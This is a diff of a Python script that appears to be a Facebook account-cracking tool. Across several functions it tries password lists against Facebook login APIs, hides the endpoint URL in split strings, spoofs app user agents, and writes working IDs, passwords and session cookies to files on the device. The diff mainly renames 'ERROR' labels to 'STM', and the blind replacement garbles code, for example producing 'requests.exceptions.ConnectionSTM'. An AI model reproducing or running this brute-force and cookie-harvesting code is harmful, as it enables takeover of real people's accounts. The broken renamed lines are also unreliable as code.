-                    open('/sdcard/ERROR-FILE-M4-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}SUCCESS{red}] {green}{sid} {white}| {green}{ps} ")
+                    open('/sdcard/STM-FILE-M4.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/STM-FILE-M4-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
-                elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                     open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                elif 'www.facebook.com' in q['STM']['message']:
+                    #print(f"\r\r{red}[STM-CP] {sid} | {ps} ")
+                     open('/sdcard/STM-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                      break
                 else:continue
@@ -971,7 +971,7 @@ try:
         try:
             global oks,cps,loop
             abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+            sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -988,7 +988,7 @@ try:
                       "cpl": "true",
                       "family_device_id": str(uuid.uuid4()),
                       "credentials_type": "device_based_login_password",
-                      "error_detail_type": "button_with_disabled",
+                      "STM_detail_type": "button_with_disabled",
                       "source": "register_api",
                       "email": sid,
                       "password": ps,
@@ -1027,14 +1027,14 @@ try:
                 q = session.post("htt"+"ps:"+"//b-"+"gra"+"ph.fa"+"ceboo"+"k.com"+"/auth"+"/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                    open('/sdcard/ERROR-FILE-M5.txt','a').write(sid+'|'+ps+'\n')
-                    open('/sdcard/ERROR-FILE-M5-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}SUCCESS{red}] {green}{sid} {white}| {green}{ps} ")
+                    open('/sdcard/STM-FILE-M5.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/STM-FILE-M5-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
-                elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                     open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                elif 'www.facebook.com' in q['STM']['message']:
+                    #print(f"\r\r{red}[STM-CP] {sid} | {ps} ")
+                     open('/sdcard/STM-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                      break
                 else:continue
@@ -1045,7 +1045,7 @@ except:pass
 def __MTDONE6__(ids,names,passlist,tl):
     global oks,cps,loop
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         first = names.split(' ')[0]
@@ -1064,7 +1064,7 @@ def __MTDONE6__(ids,names,passlist,tl):
                 "cpl": "true",
                 "family_device_id": str(uuid.uuid4()),
                 "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
+                "STM_detail_type": "button_with_disabled",
                 "source": "device_based_login",
                 "email": sid,
                 "password": ps,
@@ -1100,19 +1100,19 @@ def __MTDONE6__(ids,names,passlist,tl):
             q = json.loads(po)
             if 'session_key' in q:
                 cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f"\r\r{red}[{white}✓{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                open('/sdcard/ERROR-FILE-M6.txt','a').write(sid+'|'+ps+'\n')
-                open('/sdcard/ERROR-FILE-M6-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                print(f"\r\r{red}[{white}✓{red}] {red}[{green}SUCCESS{red}] {green}{sid} {white}| {green}{ps} ")
+                open('/sdcard/STM-FILE-M6.txt','a').write(sid+'|'+ps+'\n')
+                open('/sdcard/STM-FILE-M6-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                 oks.append(sid)
                 break
-            elif 'www.facebook.com' in q['error']['message']:
-                #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+            elif 'www.facebook.com' in q['STM']['message']:
+                #print(f"\r\r{red}[STM-CP] {sid} | {ps} ")
+                open('/sdcard/STM-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                 cps.append(sid)
                 break
             else:continue
         loop+=1
-    except requests.exceptions.ConnectionError:
+    except requests.exceptions.ConnectionSTM:
         time.sleep(10)
     except Exception as e:
         pass 
@@ -1120,7 +1120,7 @@ def __MTDONE6__(ids,names,passlist,tl):
 def randm(ids,psd,tl):
     global oks,cps,loop
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -1145,7 +1145,7 @@ def randm(ids,psd,tl):
             "sim_country": "id",
             "network_country": "id",
             "relative_url": "method/auth.login",
-            'error_detail_type':'button_with_disabled',
+            'STM_detail_type':'button_with_disabled',
             'enroll_misauth':'false',
             'generate_session_cookies':'1',
             'generate_machine_id':'1',
@@ -1185,13 +1185,13 @@ def randm(ids,psd,tl):
                 if res == 'LIVE':
                     print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
                     oks.append(ids)
-                    open('/sdcard/ERROR-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                    open('/sdcard/STM-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                     #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
-            elif 'www.facebook.com' in q['error_msg']:
+            elif 'www.facebook.com' in q['STM_msg']:
                 cps.append(ids)
                 #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
-                open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/STM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
         loop+=1
     except Exception as e:
         pass
@@ -1199,7 +1199,7 @@ def randm(ids,psd,tl):
 def randm1(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -1224,7 +1224,7 @@ def randm1(ids,psd,tl):
             "sim_country": "id",
             "network_country": "id",
             "relative_url": "method/auth.login",
-            'error_detail_type':'button_with_disabled',
+            'STM_detail_type':'button_with_disabled',
             'enroll_misauth':'false',
             'generate_session_cookies':'1',
             'generate_machine_id':'1',
@@ -1264,15 +1264,15 @@ def randm1(ids,psd,tl):
                 if 'Photoshop' in res:
                     print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                     oks.append(ids)
-                    open('/sdcard/ERROR-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
+                    open('/sdcard/STM-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                     #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
-            elif 'www.facebook.com' in q['error_msg']:
+            elif 'www.facebook.com' in q['STM_msg']:
                 cps.append(ids)
                 #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
-                open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
+                open('/sdcard/STM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
         loop+=1
-    except requests.exceptions.ConnectionError:
+    except requests.exceptions.ConnectionSTM:
         time.sleep(10)
     except Exception as e:
         pass
@@ -1281,7 +1281,7 @@ def randm1(ids,psd,tl):
 def randm2(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
@@ -1305,7 +1305,7 @@ def randm2(ids,psd,tl):
             "sim_country": "id",
             "network_country": "id",
             "relative_url": "method/auth.login",
-            'error_detail_type':'button_with_disabled',
+            'STM_detail_type':'button_with_disabled',
             'enroll_misauth':'false',
             'generate_session_cookies':'1',
             'generate_machine_id':'1',
@@ -1345,18 +1345,18 @@ def randm2(ids,psd,tl):
                 if 'Photoshop' in res:
                     print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                     oks.append(ids)
-                    open('/sdcard/ERROR-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
+                    open('/sdcard/STM-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                     #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
-            elif 'www.facebook.com' in q['error_msg']:
+            elif 'www.facebook.com' in q['STM_msg']:
                 cps.append(ids)
                 #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
-                open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/STM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                 break
             else:
                 continue
         loop+=1
-    except requests.exceptions.ConnectionError:
+    except requests.exceptions.ConnectionSTM:
         time.sleep(10)
     except Exception as e:
         pass
@@ -1365,7 +1365,7 @@ def randm2(ids,psd,tl):
 def randm3(ids,psd,tl):
     global loop,oks,cps
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}STM{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';{R4}',
     session=requests.Session()
@@ -1386,18 +1386,18 @@ def randm3(ids,psd,tl):
                     print(f"\r\r{red}[{white}✓{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                     #print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     oks.append(ids)
-                    open('/sdcard/ERROR-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
+                    open('/sdcard/STM-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                     break
                 else:pass
             if 'checkpoint' in log_cookies:
                 #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
-                open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/STM-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
                 continue
         loop+=1
-    except requests.exceptions.ConnectionError:
+    except requests.exceptions.ConnectionSTM:
         time.sleep(10)
     except Exception as e:
         pass
@@ -1405,4 +1405,4 @@ def randm3(ids,psd,tl):
 
 
 if __name__ == "__main__":
-    ___ERROR___()
+    ___STM___()
